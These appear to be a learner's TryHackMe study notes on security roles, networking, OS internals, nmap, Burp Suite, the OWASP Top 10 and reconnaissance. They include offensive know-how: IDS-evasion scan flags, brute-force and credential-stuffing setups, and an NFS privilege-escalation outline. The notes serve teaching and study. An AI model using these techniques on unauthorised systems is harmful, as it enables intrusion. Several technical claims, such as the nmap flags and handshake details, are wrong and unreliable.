# Notes from THM on linux machine

Security Operations Center ( SOC) is a team that monitors networks and systems to detect malicious security
events. These team members seek: Vulnerabilities, Policy Violations, Unauthorized Activity, and Network
Intrusions
Threat Intelligence is information gathered in relation to adversarial entities. Intelligence is gathered by observing
real time network data or possibly third-party information like forum posts.
Digital Forensics and Incident Response (DFIR)
Digital Forensics analyze the evidence and perpetrators of cyber-crimes such as intellectual property theft
and stolen content. These team members focus on the File System, System Memory, System Logs, and Network
logs.
Incident Response is intended to reduce damage and recover quickly after an attack. It could be a data
breach, defacing of the website, but often something less critical like a policy violation or a misconfiguration of
hardware.
Malware Analysis team members seek out malicious software that comes in a variety of forms and
techniques. Ransomware can encrypt all your files until you pay a sum to someone holding them. Static analysis
can be performed by someone that understands assembly language, while dynamic analysis is done by allowing the
program to run and observing its methods.
Security Analysts explore company networks and uncover actionable data and communicate to engineers to develop
preventative measures. The pay attention to trends and attack methods and develop security plans accordingly.
Security Engineers modify, identify, and maintain security systems. They maintain security controls, develop
networks and prevent cyber-attacks.
Incident Responders create policies and protocols to mitigate damage during and after an attack. Typically, very
active during an event and involved in post-incident reporting.
Digital Forensics Examiners look at the course of events that took place to discover evidence and report.
Malware Analysts look at suspicious or malicious programs and report on what they discover. They perform a
reverse-engineering role and then report on their findings.
Penetration Testers, also known as Ethical Hackers, attempt to find flaws and vulnerabilities within a network or
system. They intentionally exploit these vulnerabilities to evaluate risk for a company so they can react
accordingly.
Red Team Members are similar to pen-testers; pen-testers typically look for many vulnerabilities and points of
weakness, where Red Teamers directly assault known vulnerabilities to test defenses.
Security Information and Event Management (SIEM) gathers security information from multiple systems and
presents them in one interface. Using machine learning, these systems can identify unusual behavior from users
and highlight possible security threats that defy user habits.
Internet Control Message Protocol (ICMP) and ping determine connection performance between devices. The
travel time of a packet between devices is known as ping. This is performed using a echo packet and an IMCP echo
reply from the target device.
Subnetting is when you subdivide a network into smaller pieces. This could be done to create networks for specific
divisions of a business, like accounting and finance. This might give users different privileges and access based on
the subnet they’re working within. The networks are represented by a number known as the subnet mask.
Subnetting accommodates benefits such as security, control, and efficiency.
Address Resolution Protocol (ARP) allows a device to associate it’s MAC address with an IP address. Each device
on the network has a ledger, or cache, where information is stored. The device broadcasts ARP request and replies
to the entire network until it finds the address it is seeking. This handshake is then stored in the devices cache.

Dynamic Host Configuration Protocol (DHCP) assigns IP addresses to devices within a network if it has not already been manually assigned. A DHCP request is called a Discover and the reply is called an Offer. Open Systems Interconnection (OSI) Model provides a protocol for communication over a network. Composed of 7 layers: Application, Presentation, Session, Transport, Network, Data Link, Physical.
Encapsulation is when information is added to data after specific processes have been completed.
The Application layer (7) is where protocols are in place to determine how a user will interact with data. This gives
networking options to applications and an interface through which they can transmit data.
The Presentation layer (6) is where information from the application layer is translated. It’s main purpose is
reformatting submitted data from a user to a computer for processing. Data encryption also happens at this layer.
The presentation layer receives data from the application layer. This correctly formats data for reception in the
session layer.
The Session layer (5) creates a connection to the computer we are sending the user data to. This layer synchronizes
the connection between the two computers and breaks down the data into smaller chunks known as packets. These
packets are more secure in a situation where you may lose data in transmission.
The Transport layer (4) uses TCP and UDP protocols to send data between devices. TCP is a more secure way to
transmit data in a reliable way that prevents too much information from being sent at one time. UDP is less secure
but much faster and capable of sending more data at one time. UDP is terrible for spotty connections because there
is no way to ensure the data was received.
The Network layer (3) is where data is re-assembled from packages and routed to the correct location. Using Open
Shortest Path First (OSPF) and Routing Information Protocol (RIP) to determine optimal pathing, it seeks out the
fastest, shortest, and most reliable path based on these factors. All information is in IP Addresses.
The Data Link layer (2) deals with physical addressing via MAC Addresses and the Network Interface Card (NIC).
The Physical layer (1) deals with the physical connections and hardware of the network, like cables.
Packets and Frames are how information is broken down into more manageable pieces of data through a process
called encapsulation.

TCP Transfer Control Protocol is a protocol that ensures reliable data transfer, and if there are any errors the data
must be present in whole. There are types of headers for this data, such as source and destination IP addresses,
source and destination ports, and a sequence number that is randomly assigned to be the first piece of data sent. A
sequence number assigns placement order to a packet. The checksum is a calculation is performed and the output
recorded – if the receiving device does not yield the same calculation, then you know that data is corrupted or
missing.
UDP User Datagram Protocol is a stateless protocol that sends data without verifying that is was received. It does
not reserve a continuous connection and continues to send data even if the recipient is unresponsive.
Ports can be thought of as a portal that is designed to receive data of a specific type or size. There are thousands of
ports and certain ones fulfill specific purposes.

Virtual Protected Networks (VPN) create an obscured digital path or tunnel between sender and receiver. Point-to-
point Tunneling Protocol (PPTP) is the technology used to accomplish this. Internet Protocol Security (IPSec) uses

IP addressing to encrypt data.

Virtual Local Area Network (VLAN) is a method of segregating devices within a network into multiple sub-
networks.

Domain Name System (DNS) is used to translate the numerical addresses of the internet into plain language that a
human can easily understand, remember, and manipulate.
Top-Level Domain (TLD) is the right-most portion of a URL, the ‘.com’ or otherwise at the end of the domain
name. There are Generic (gTLD) top levels, which denote the type of organization associated with the website,
such as .gov, .org, .edu. Country Code (ccTLD) URLs denote the country that this URL is associated with, such as
.co.uk or .ca for the United Kingdom and Canada, respectively.
The Second Level Domain is the domain name of the site, and can be 63 characters long including a-z, 0-9, and
hyphens.
A Subdomain is a subdivision of the second-level domain and can be used to create subdivisions of your website.
‘A’ Records resolve to IPv4 IP addresses.
‘AAAA’ Records resolve to IPv6 IP addresses.
A CNAME Record is a secondary domain name that links to the same address on the web. Two synonymous names
that lead to the same address.
MX Records resolve the server addresses for email.
TXT Records store text-based data and can be used to verify ownership of the domain.
When making a DNS request, your computer will first check to see if you have visited the domain before and if
there is any related data saved within your cache. If you find a result locally, the request ends here. If it is not
found locally, the root server is contacted which will refer you to the correct address per submitted domain name.
The TLD server will hold information about where to find the authoritative server, which is also known as the
nameserver. There may be multiple nameservers for a single domain. The authoritative server then sends this DNS
record to the Recursive DNS server where a local copy is cached for future searches. DNS records are assigned a
Time To Live (TTL) value that indicates the amount of seconds that this cached information should be saved for.
Uniform Resource Locator (URL) which is composed of several pieces of information. The scheme (http) instructs
the browser which protocol to use. After this, you can optionally submit username and password via the URL. The
Host/Domain name comes next and is the title of the website most people are familiar with. After this comes the
port value and path, which usually includes the port number and the file name you are seeking within the resource.
Next comes a Query String which seeks specific pieces of information within, and a fragment which tells which
page the information is on.
Cookies are small pieces of data that a server uses to ‘remember’ you. When you return to the site, the server
recognized your IP and can appropriately relay past information, such as site preferences, user name, etc. If you
look through developer tools when accessing a website, you can view the cookies the site used to identify you. This
is located under the Network tab.
Front-end is the way your browser displays a website, also known as client-side.
Back-end is a server that processes the data received and returns data, also known as server-side.
Load Balancing is when incoming web traffic is distributed more evenly across multiple servers. This means that if
you receive too much data for a single server, the ‘weight’ of the incoming load can be allocated to several
receptacles so that nothing becomes overwhelmed. Load Balancing devices can also complete health checks on the
networked servers to determine if they are working properly and suitable to receive data.
Content Delivery Networks (CDN) can be used to reduce incoming traffic to a site. A CDN will distribute static
versions of webpages to servers around the world – allowing for data to be accessed closer to the client. USA sites
can distribute to Chinese servers so that side of the world can quickly access the information.
Web Application Firewall (WAF) occurs after the web request is sent and before the web server receives the data.
WAF use Rate Limiting and analysis to determine incoming threats, and lowering the number of requests that can

be received by a single client.
Web Servers delivers files from it’s root directory to a client that requests the data.
Virtual Hosts are used to host multiple sites with different domain names.

LINUX
The ‘&’ operator allows for the execution of commands in the background.
The ‘&&’ operator makes a list of commands to run.
The ‘>’ operator is an output re-director – it sends output from a function somewhere else.
The ‘>>’ operator is similar to the ‘>’ command, except this one appends information instead of replacement.
The /etc or ‘etcetera’ root directory stores system files used by the OS. This contains the shadow and passwd files.
These files show how password information is stored in Linux via sha512 encryption.
The /var or ‘variable data’ root folder stores data that is frequently accessed or written by services or applications
that are running on your system.
/root is the home directory and is the home for the root system user.
The /tmp is a unique root directory that is volatile and for temporary data that is only used one or two times. This
folder is cleared when the system is shut down or restarted. ANY user can write to this folder by default, making it
useful for pentesting purposes.
Secure Copy (SCP) is a means of securely copying a file between two computers using the SSH protocol to ensure
authentication and encryption.
Namespaces are used to divide resources among the processes using them. This is useful for security as you can
isolate specific processes or corral them away from other processes.
Process ID (PID) indicates the ID of a process, a PID of 0 means that the process started upon boot.
Command systemctl allows you to interact with the systemd process aka daemon.
Robots.txt is a file that is first indexed by crawlers when they visit a site. This file must be saved within the root
directory and can be assumed to be a text file. The file gives the permissions for the crawler, specifying which
directories and files it is allowed to access.
User-agent specifies the type of crawler that is allowed to access your site. A wildcard (*) will denote that
any crawler can access your site.
Allow / Disallow specifies the directories the crawler is allowed or not allowed to index.
Sitemap are XML formatted and references where the sitemap is located for the crawler.
Crontab is a process that is started upon boot, which manages Cron processes. These processes initiate after a
designated amount of time has passed. Using the Crontab Generator site is a simple way to generate a cron in
human terms, which can then be implemented via ‘ crontab -e ‘ command + switch.

WINDOWS

New Technology File System (NTFS) is the most modern iteration of the Windows file system, which proceeds the
FAT16/32 and High Performance File System (HPFS). FAT 32 is still used for USB drives and SD cards. NFTS is
a journaling file system that can repair files using log files. Improvements to NTFS have allowed for >4GB files,
permission setting, compression, and encryption.
Alternate Data Streams (ADS) is a file attribute that allows files to contain more than one data stream. By default,
Windows Explorer does not display ADS to the user. PowerShell gives us the ability to view ADS.
User Account Control (UAC) prevents an administrator from running with elevated permissions, and the user will
be prompted to run as administrator when modifying system files. UAC does NOT apply to the built-in
administrator account.
Windows Updates are typically released on the second Tuesday of each month, known as Patch Tuesday. Urgent or
critical updates are pushed via Windows Update service.
Control /name Microsoft.WindowsUpdate is the command to run window update.
Windows 10 is the first iteration of windows that does not allow you to ignore or bypass their system updates. Now
you are forced to update, which increases the security and operation of the device.
Volume Shadow Copy Service (VSS) creates a consistent shadow copy, or snapshot, of data that is intended to be
backed up. Malware writers know that this is vulnerable and will try to delete these files in a ransomware attack
where the attacker makes files unrecoverable. Unless you have an offline backup, you will be unable to recover
your data.
CORE WINDOWS PROCESSES
Task Manager – More Details
This is a window I was very familiar with, although I did not know that by right-clicking the column labels,
you can toggle additional information columns.
-Type: This means either Apps, Background Processes, or Windows Processes
-Publisher: displays the author of the file or program.
-PID: process identifier number is a unique identifier assigned when a process starts, and is assigned to all
processes that fall under the umbrella of the original process.
-Process Name: yields the common name of the process.
-Command Line: yields the full command used to launch the process.
-CPU: the amount of processing power needed to actively run the process.
-Memory: the amount of physical working memory used by the process.
The PID for System is ALWAYS 4, or Process ID 4.
User Mode and Kernel Mode are two different modes that the processor operates under. Applications run in User
Mode, while core OS components run under kernel mode. Drivers may operate within both of these modes.
User Mode means when you start an application, windows launches the app and assigns a virtual address
space and a private handle table. This address is private, so that other processes cannot be assigned to the same
virtual address. Each app runs in isolation, meaning that if one app crashes, it does not bear influence on the
operation of other apps. Kernel mode addresses cannot be accessed by the user mode addressing system.
Kernel Mode means anything operating in this mode shares a single virtual address space. If one kernel
mode driver crashes, the others will as well. If one of these drivers writes to the wrong virtual address, it can
compromise and corrupt existing operating system data.
Session Manager Subsystem (smss.exe) is also known as the Windows Session Manager. This creates new
sessions, and is the first user-mode process that is started by the kernel. It starts the kernel and user modes of the
Windows subsystem which includes kernel-mode win32k.sys and user-mode winsrv.dll and csrss.exe. Smss.exe
starts csrss.exe, the Windows subsystem, and winnit.exe in session 0. csrss.exe and inlogon.exe for session 1,
known as the user session. Smss.exe copies itself into the new session and then terminates itself, meaning a child
instance creates other child instances within new sessions, and then self-terminates.
Client Server Runtime Process (csrss.exe) is a critical process and is always running. It manages the user-mode
side of the windows subsystem. It operates the win32 console window and process threads. It makes windows api

available to other processes and manages shutdown of the windows OS.
Windows Initialization Process (wininit.exe) launches Service Control Manager (services.exe) and Local Security
Authority (lsass.exe) and lsaiso.exe within session 0. It is only visible if Credential Guard is enabled.
Service Control Manager (SCM or services.exe) starts, ends, and interacts with services. It maintains a database
that can be manipulated with sc.exe, a built-in Windows utility. This is stored within the registry
HKLM\System\CurrentControlSet\Services.
Last Known Good Configuration (LKGC) is In the directory HKLM\System\Select\LastKnownGood. This is the
parent process to svchost.exe, spoolsv.exe, msmpeng.exe, dllhost.exe.
Service Host (svchost.exe) hosts and manages services. These services are implemented as DLL’s, and these are
stored in the registry under Parameters subkey within ServiceDLL.
HKLM\SYSTEM\CurrentControlSet\Services\SERVICE NAME\Parameters. Parameter -k groups similar services
that share a process. On machines that run more than 3.5GB of memory, these services will each run their own
process.
Svchost.exe is commonly exploited as it is always running multiple processes. Attackers will try to hide
similarly named executables among these services, such as scvhost.exe, so that users will not notice the malicious
scripts running.
Local Security Authority Subsystem Service (LSASS) enforces security policies for windows, verifying users,
managing password changes, and granting access tokens. It writes to Windows Security Log, and creates tokens
for Security Account Manager, Active Directory, and NETLOGON. Tools such as mimikatz can retrieve credentials
from this while hiding in plain sight.
Windows Logon (winlogon.exe) handles Secure Attention Sequence (SAS), which is otherwise known as Ctrl + Alt
+ Delete. It also loads NTUSER.DAT and user profiles.
Windows Explorer (explorer.exe) grants user access to folder and files, while also operating the start menu and
Taskbar.

NMAP
TCP Connect scans (-sT) looks at the three-way handshake – the client sends a request via SYN flag, the server
responds with an ACK flag, and the terminal sends this ACK flag as a TCP request for the third part of the
transaction.
If nmap sends a TCP request with the SYN flag to a closed port, the server responds with a TCP packet
with the RST (reset) flag. This tells nmap that the port is closed. If the port is open the server will respond with
SYN/ACK flags.
** IF the server does not respond, then this indicates that the port is open, but hidden behind a firewall. If
the port was simply closed it would respond with an RST flag, indicating that it is hidden. The following command
can be used to prevent accurate readings of the target server.
Iptables -I INPUT -p tcp –dport <port> -j REJECT –reject-with tcp-reset
SYN scans (-sS) scan the TCP port-range of a target server, this is sometimes called a ‘stealth’ or ‘half-open’scan.
SYN scans return a RST TCP packet after receiving a SYN/ACK flag from the server. This can be used to
overcome older Intrusion Detection systems since they are looking for unusual three-way handshakes. In this case,
the 3-way handshake is never completed, so the security system may overlook this attempt at contact. These will
not be logged by a port-listening application. SYN scans are faster and stealthier than TCP Connect scans. SYN
scans can be problematic on Linux devices as they will require sudo permissions, and these scans can sometimes
break an unstable service.
Nmap runs SYN scans if it has sudo authorization, otherwise a TCP Connect scan will be initiated.

UDP scans (-sU) for open UDP ports, which is slower and more difficult to scan. UDP connections are stateless,
meaning that UDP connections send packets without verifying that they were received by the target – relying on
speed over quality. Nmap sends completely empty requests to the ports in question. If there is no response from a
UDP port, nmap describes the port as being open|filtered. This means that it suspects the port is open but protected
by a firewall. A second request will be sent as a secondary check to confirm that it is open|filtered. When the port
is closed, the target server will respond with an ICMP ping packet containing a message that the port is unreachable
– clearly identifying a closed port for nmap. Since UDP scanning is slow (20 mins to do 1000 ports) we can use a
command to limit the amount of ports searched with a specific level of priority.
Nmap -sU –top-ports 20 <target>
NULL, FIN, and Xmas TCP scans are less common, but stealthier than a SYN scan.
NULL scans (-sN) are sent without flags, with the target server responding with RST flag.
FIN scans (-sF) are similar to NULL scans, except they send a FIN flag instead of a blank packet.
Xmas scans (-sX) sets three flags – PSH, URG, and FIN – and submits a malformed packet looking for an
RST response from a closed port. The name is given because when viewed in packet capture, they appear to have
green and red blinking lights. These scans describe the targeted port as open|filtered, closed, or filtered. Filtered
typically indicates that the server responded with a ICMP unreachable packet.
RFC 793 mandates that network hosts respond to malformed TCP packets with RST packets. Since a firewall will
seek out unusual SYN requests, avoiding the use of SYN via malformed packets is a key practice in firewall
evasion.
Nmap Scripting Engine (NSE) is written in lua scripting language and extends the functionality of nmap. This
includes commands like:
Intrusive: likely to affect a target
Vuln: scans for vulnerabilities
Exploit: attempts to exploit discovered vulnerabilities.
Auth: attempt to bypass the authentication of running services.
Brute: brute forces credentials for a running service.
Discovery: queries running services for further information.
These are used in the format –script=<scriptName> i.e. –script=vuln or --script=safe
--script=http-fileupload-exploiter runs specific scripts, these can be chained via comma as:
--script=smb-enum-users, smb-enum-shares
A standard Windows host will block all incoming ICMP packets. If one of these targets is scanned by nmap, nmap
will label it dead and not worth scanning. Pinging is a primary method for nmap, and can be bypassed using the
switch (-Pn).
-F is used to fragment packets, making them less detectable by a firewall or IDS.
-f is an alternative to -F, and provides more control over packets via –mtu <number>
This number indicates the maximum transmission unit size, must be a multiple of 8.

--scan-delay <time>ms is used to add a delay between packages sent, which is useful for probing unstable networks
and evading time-based firewall/IDS triggers.

--badsum generates an invalid checksum, and this can be used to detect a firewall/IDS.

NETWORK SERVICES
Server Message Block Protocol facilitates client-server communication for sharing file, printers, and serial ports
within a network. Servers make resources like shared file-systems available to clients on their network. These are
known as response-request protocols, transmitting multiple times between server and client to establish
connections.
SMBs are the commands sent to the server to access shares, files, and folders over the network.
Enumeration is the act of gathering information about a target device, seeking exploitation paths. It can be used to
gather usernames, passwords, network data, hostnames, app data, and services data. The first step in this process is
to conduct a port scan.
SMB share drives are a great place to begin looking for vulnerabilities and sensitive information.
Insecure Direct Object References (IDOR) is a vulnerability related to Broken Access Control
Confidentiality, Integrity, and Availability (CIA) are the key principals of cybersecurity.
Intrusion Detection System (IDS) detects intrusion attempts and tries to detect attackers entering the network.
Intrusion Protection System (IPS) blocks detected intrusion to prevent attackers.
Virtual Protected Network (VPN) ensures that your data traffic cannot be read or altered by outsiders.
Firewall Appliances are different from software based firewalls and incorporate physical hardware into your
defense systems. \
Lockheed Martin Cyber Kill Chain includes seven steps:
1. Reconnaissance – where data is gathered about the target, like server type, OS, IP, usernames, and emails.
2. Weaponization – preparing of malicious agents for use against the intended system.
3. Delivery – implementing the malicious agents.
4. Exploitation – the users system executes the malicious components.
5. Installation – malicious components are successfully installed into the system.
6. Command and Control (C2) – attacker gains control and command of the system.
7. Actions and Objectives – attackers objectives are active on the intended system.
Exchangeable Image File Format (EXIF) creates metadata that embeds in an image, including information about the
time and location of the image, as well as ISO levels, aperture, shutter speed, and the model information for the
camera. This makes EXIF files a likely place where an attacker may look for details like GPS coordinates of where
the image was taken.
Telnet is a protocol that allows for remote access to other machines using clear text.
File Transfer Protocol (FTP) allows for remote transfer of files over a network. FTP sessions operate using a
command channel and a data channel. It can have an Active FTP connection, where the client opens a port and
listens to the server. Passive FTP connections occur when the server passively listens to a port while the client
connects to it. This allows for the sending of commands even while you transfer files .

Network File System (NFS) is a tool to share files and directories over a network. Files are mounted to a server and
accessed by clients.
Enumeration is when a connection is established to determine attack vectors for exploitation within a system.
NFS-Common is a package which enables enumeration of the NFS server, including programs like lockd, statd,
showmount, nfsstat, idmapd, and mount.nfs.
Root Squash prevents root access for anyone connecting to the NFS share. This can be turned off allowing a
remote user to access the root.
Superuser ID (SUID) allow for the changing of permissions for users and groups.
Our method is to upload files to the NFS share, change the permissions, access bash shell via executable, then log in
via ssh to get to the root shell.
Simple Mail Transfer Protocol (SMTP) is an email server that verifies sender and recipient, send the mail, and
returns to sender if the destination is not valid.
Post Office Protocol (POP) and Internet Message Access Protocol (IMAP) are responsible for transferring mail
between a client and SMTP server. POP is a simple method that downloads the inbox from a mail server to the
client. IMAP synchronizes the inbox across multiple machines.

BURP SUITE BASICS
Burp Suite is a framework based in java that is used for web-application penetration testing. It is commonly used to
test Application Programming Interfaces (API). It can be used to manipulate data before it is received by a server.
You can view and modify data that is sent from a client.
Burp Suite Enterprise is a version that is used to constantly monitor information from a server.
Proxy: used to modify requests and responses from web applications.
Repeater: used to capture, modify, and resend a request multiple times. Useful in SQL injections.
Intruder: spams an endpoint with requests, used in brute force attacks and fuzzing.
Decoder: decodes captured information or encodes a payload.
Comparer: compares two pieces of data bit by bit.
Sequencer: creates sequences where there should be random algorithm number results.
BURP REPEATER
The repeater allows us to create or relay intercepted web requests to a target. You can capture the request in
the proxy, edit it, and send that modified request repeatedly.
Query Parameters are the data sent to the server via URL. This is also known as GET requests.
Body Parameters are the same thing, but POST requests.
Request Cookies contains a list of the cookies being sent with each request.
Request Headers allow you to modify, view, and access headers being sent with our requests.
Response Headers show us the responses from the server – they cannot be edited and only appear after you
have sent a request AND received a response.
BURP INTRUDER

The Intruder lets us automate requests, useful for brute force attacks and fuzzing. It takes a request and
uses it as a template to send many more requests with slightly altered values. The target or position of the intruder
is indicated by being within a pair of § (silcrow).
Fuzzing is when you check for all endpoints in a URL ( like about/3 or about/4, about/69, etc.) until it has
checked for all terms within a wordlist or numeric entries.
Attack Types
Sniper is the most common, using one Payload Set. The payload is delivered to the first target, cycling
through each term in the word list, and then will switch to the next indicated target, and apply the same wordlist.
Requests = number of words * number of positions.
Battering Ram also takes one payload set, yet instead of applying each payload on a case by case basis, it
applies them to every position at the same time. It spams payloads until something works.
Pitchfork is the second most common method of attack, which is akin to using multiple sniper attacks
simultaneously. It uses one payload set per position for up to 20 positions, then iterates through all positions and
payloads simultaneously. It is a useful tool for creating credential stuffing attacks.
Cluster Bomb allows you to choose multiple payload sets, one per position up to 20 times. While pitchfork
iterates through each payload set simultaneously, cluster bomb tests every possible combination of payloads by
iterating through each set individually. This will create a great deal of traffic with all the additional iterating. A
moderate payload on burp Community will take a very long time due to the rate-limiting of the trial versions. Very
useful for brute-forcing credentials when you do not know usernames.
BURP DECODER
Decoder is used to decode target information and encode our own data for injection. Using Smart Decode
and ‘Hashums’ of data, target data is decoded recursively until it is readable in plaintext. It can encode and decode
Plaintext, URL, HTML, Base64, ASCII Hex, Hex, Octal, Binary, and Gzip.
Hashing is a one-way process that transforms data into a unique pattern that is impossible to reverse, ensuring a
unique hash for each piece of data submitted. Hashes are used to verify document integrity because even a very
small change to the file data will create a totally different hashum. MD5 is a common algorithm used to hash data.
Hashing can even keep passwords relatively secure after a data breach.

BURP COMPARER
The comparer lets us analyze two pieces of data by either bytes or ASCII. It is useful for comparing two
very large pieces of data, as it will show you all differences between the two data sets. It will highlight
modifications and deleted bits from the first and second set of data.
BURP SEQUENCER
The sequencer measures the entropy of tokens, which are strings used to identify things, and should be
cryptographically secure. Cross-site Request Forgery (CSRF) tokens protect a form submission. If tokens are not
generated securely, they can be predicted and used to crack passwords.
Live Capture allows us to pass a request from the proxy to the sequencer, then making a request thousands
to tens of thousands of times until the sequencer has collected enough token data to reliably generate a viable token.
BURP EXTENDER
The extender is a management interface for burp extensions that you aquire via the Burp App Store.
OWASP TOP 10

Open Web Application Security Project (OWASP) has 10 main concerns: Injection, Broken Authentication,
Sensitive Data Exposure, XML External Entity, Broken Access Control, Security Misconfiguration, Cross-Site
Scripting, Insecure Deserialization, Component Vulnerabilities, and Insufficient Logging/Montitoring.
Injection: a common flaw in modern applications, where a user input is interpreted as commands or
parameters by the application receiving the user data. SQL and Command injections are the most common types.
With this access they can modify or delete database information or execute commands that allow an attacker to
access user accounts. This can be remedied by including an ‘allow list’ that checks the submitted information
before it can be submitted to the server. Stripping input, or disallowing certain characters or strings, is another
method of prevention.
Command Injection happens within server-side code in a web application when it makes a system-call on the host
machine. This could allow for an attacker to initiate a reverse-shell where they could own your server. Then they
can enumerate info on your system an expand the attack.
Authentication allows for users to access a site through verification of identity, typically via username and
password. HTTP is a stateless communication protocol, so session cookies must be used to know the sender of
data. Common exploits for this category include brute force, weak credentials, and weak sessions cookies. If the
session cookies or passwords contain predictable values, they can be brute forced by applications that spam
credentials until they are granted access.
To counter these, you can force strong password policies, which may include account lockout after a certain
amount of attempts. Multi-factor authentication is another useful strategy.
Authentication grants users access to information after their identities are verified. Since HTTPS is stateless,
session cookies must be used to keep track of user actions so the server knows who is sending what data. This
system of authentication and session management are vulnerable to brute force attacks, weak credentials
exploitation, or predictable cookies that another user could easily emulate.
Sensitive Data Exposure describes the event of a webapp divulging sensitive data. This can be achieved via ‘Man
In The Middle’ attacks where attackers force connections through their own specific device, which allows them to
take advantage of weak encryption of this intercepted data. This is a complicated version os SDE.
Databases are usually hosted on servers and managed via SQL or MariaDB – but they can be stored in files as well,
known as flat-file databases and stored within a single file., which means that if this is stored on the root user, a
malicious actor can infiltrate and download this file. Sqlite3 is an example of a flat-file database.
XML External Entity (XXE) is an attack method that exploits XML features. Malicious agents can interact
with backend or remote systems to access files, initiate DoS attacks, Server-Side Request Forgery (SSRF), port
scanning, and remote code execution.
In-band XXE is one where attackers gain immediate response from a payload.
Out-of-band XXE has no immediate response and the output from the payload must be delivered to another
file or an attacker controlled server.
eXtensible Markup Language (XML) defines rules for encoding documents that can be read by computers
and humans, used to store and move data. It can be used on any system and adapts to technology changes. Data
can be modified without affecting the presentation of data, meaning that it does not require any conversions or
formatting when changing systems. XML uses DTD and Schema for validation purposes.
<?xml version=”1.0” encoding=”UTF-8”?> is known as the XML prolog and, while not required, is usually
the first line of code on an xml file.
The root element <root> (it was <mail> in the example) contains the children elements
Document Type Definition (DTD) defines legal elements of an XML document.
PCDATA in the DTD stands for Parseable Character
Insecure Direct Object Reference (IDOR) is an access control vulnerability that exploits misconfiguration of user
input.

Cross-site Scripting (XSS) is typically a webapp vulnerability where an attacker injects code to execute malicious
scripts on someones machine. This can occur via JavaScript, VBScript, Flash, and CSS. There are three types of
XSS:
Stored XSS occurs when user input is not sanitized, and is the most dangerous form of XSS. A malicious
string is injected into the websites database.
Refelcted XSS is when the attacker uses a malicious URL, having to bait an ignorant user into clicking the
malicious link and requesting the files placed by the attacker.
Document Oriented Model (DOM)-based XSS is a programming interface for XML and HTML. It
pretends to be the webpage in question, which is a file.
Examples of XSS payloads include: pop-ups, adding your own HTML to existing page structure, keyloggers, and
port scanning. XSS-payloads.com is a great resource for payloads, tools, and relevant documentation.
Insecure Deserialization is when someone uses untrusted data to exploit the logic within an application. Data to be
processed by the application is replaced with malicious code.
Obkect Oriented Programming focuses on state and behavior. In the case of a desk lamp, on and off would be
examples of behaviors, while bulb type would fall under state.
Serialization is when programming objects are converted into formatted forms that are ready to be transmitted
across hardware, networks, or into storage.
Known Vulnerabilities are one of the highest ranking (3) threats, as they are easily exploited using known and
exposed hacks, as well as common as companies do not always update their software and hardware on time.

CONTENT DISCOVERY
This is using the publicly available information on a site to look for vulnerabilities or access to unauthorized parts
of the site.
Robots.txt is a convenient place to look first, as it is a list of site pages that the site owner DOES NOT want
the crawler to access. This indicates that there could be sensitive or private information on these pages, so perhaps
your early data collection should begin here.
The Favicon is the small icon that appears to the left of the site page name on the tab within your browser.
It is a small artistic indicator of the page you are visiting. If you look at the page source you can find a link to the
images/flavicon.ico file which provides some information, including a hash mark. This mark can be used in the
owasp database to identify the owner of the site via their Favicon registration.
The sitemap is the next place to check, as it could contain links to old parts of the website that are no longer
within the site directory.
HTTP Headers, which can be found using a curl command in the CLI, can sometimes have names that
reveal information or links to hidden parts of the site.
The framework stack allows you to see additional information about the site it created, which is typically
available when viewing the page source of the page you want to know about.
Open Source Intelligence (OSINT) is legally or publicly acquired data about an individual or organization.
This is information found via their online presence and published information about them and ownership of data
and documentation.

Google Dorking is using advanced search mechanics to look for site pages that could be vulnerable. Using
the site: filter would limit a search to a single site, and pairing that with a superuser term like ‘admin’ can help you
find the admin page of a specific site.
The Wappalyzer is a site that tells you what technology a company is using to run their site.
The Wayback Machine at https://archive.org/web/ is a historical archive of all websites since the 1990s,
which may include old and outdated pages still active, but unlinked, on a site.
Git and Github are another way you can find public data about a target.
Amazon S3 Buckets are storage services provided by AWS, allowing cloud access for users available over
http or https. The follow the format https://{name}.s3.amazonaws.com. These buckets can be discovered via urls
in the page source, GitHub repositories, or even automating search procedures that look for AWS buckets.
Wordlists can be used to automate a scan. These can include a list of common passwords, or a list of common
terms associated with folders that may contain vulnerabilities.
SUBDOMAIN ENUMERATION
This is the process of finding valid subdomains to expand our available targets and points of vulnerability. This can
be done via brute force attacks, OSINT practices, or Virtual Host.
WIRESHARK
Collecting PCAP files can be done in a number of ways. It is useful to know that your data capture is accurate by
performing a sample that makes sure everything is set up correctly. Make sure that your computer is powerful
enough to digest the incoming data, which may be an overwhelming amount. You also need enough disk space to
make sure you can store this data.
Network Taps are a physical implant in a physical network, usually attached to a cable between two pieces
of hardware. A Throwing Star Network Tap can replicate packets as they pass through the tap.
MAC Floods are when you add so many MAC addresses to the CAM table, that it can no longer accept new
entries, or new devices. This causes packets to be sent from all ports on the switch. This practice can cause great
stress on a system and it should only be attempted with caution and permission.
ARP Poisoning is when you redirect traffic from a host to the machine you choose to monitor from. This
will not stress equipment like MAC Floods, but should still be used with great caution.
When receiving data from WireShark, we can see all 7 layers of the OSI model, and what is happening on each
level.
Layer 1 will show you frames and details related to physical connections.
Layer 2 will show you the relevant MAC addresses.
Layer 3 will show you the relevant IP activity.
Layer 4 will yield details about UDP/TCP interactions as well as source destination ports. This is also the
layer that shows us protocol errors
Layer 5 shows details specific to the active protocols, showing application data.
Address Resolution Protocol (ARP) is a layer 2 protocol that deals with IP and MAC addresses, containing
RESPONSE and REQUEST messages.

NESSUS
Nessus is a vulnerability scanner that uses techniques similar to nmap to search for vulnerabilities, which
are presented in a user-friendly GUI.
HYDRA

Hydra is a brute force password cracking application that can be used against MANY MANY protocols.

IDOR
Insecure Direct Object Reference is a specific type of access control vulnerability. This is when user supplied input
to retrieve objects is used maliciously to access files or documents that are private.
Penetration testing is an authorized audit of the security of a certain organization or system. There are many ethical
questions and choices that come up while pentesting. These usually fall into three categories:
White Hat hackers remain within the law and intend on benefiting others.
Gray hat folks do not always abide by the law or ethical standards, but still intend on benefiting others.
Black hatters seek to damage a system for their gain, ransomware is an example.
Rules of Engagement was a document created in the early days of pentesting to establish an ethical code to
abide by when performing penetration tests. Permission is required to perform the pentest via authorization by the
organization or system being evaluated. Test Scope is the list of authorized targets to apply pressure to.
The Open Source Security Testing Methodology Manual (OSSTMM) is another ethics reference and is a
framework for testing systems, software, communications, applications, and the human errors related to cyber
security. It is extremely difficult to understand, very detailed, and uses unique definitions unrelated to other
lexicons.
Open Web Application Security Project (OWASP) is another framework developed by the security
community, and puts out lists of the top security vulnerabilities, including the testing approach and remediation. It
is easy to learn and implement, actively maintained, specializes in web apps and services, and covers all stages of
engagement from testing to remediation.
National Institute of Standards and Technology (NIST) Cyber-security Framework is another popular
